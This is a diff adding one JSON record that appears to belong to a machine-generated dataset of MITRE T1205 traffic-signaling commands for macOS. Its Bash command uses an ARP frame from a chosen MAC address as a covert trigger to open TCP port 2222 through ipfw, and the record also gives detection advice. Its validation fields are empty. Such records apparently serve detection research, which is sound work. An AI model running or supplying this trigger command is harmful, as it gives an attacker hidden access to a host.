@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ln -i en0 -c 1 \"arp and ether src de:ad:be:ef:00:01\" >/dev/null && ipfw add 610 allow tcp from any to me 2222 in; sleep 60; ipfw delete 610'",
+  "explanation": "Uses a crafted ARP frame from a specific MAC as a local-layer magic signal; when seen, ipfw temporarily allows TCP/2222 for 60 seconds. Requires elevated privileges.",
+  "rationale_steps": [
+    "Abuse L2 ARP traffic as a covert trigger (non-routable, low visibility across segments).",
+    "Open a hidden management port briefly upon receipt.",
+    "Detection: alert on ARP from unexpected MAC OUIs; correlate with ipfw rule changes and short-lived port 2222 openings."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-ea7bac70",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
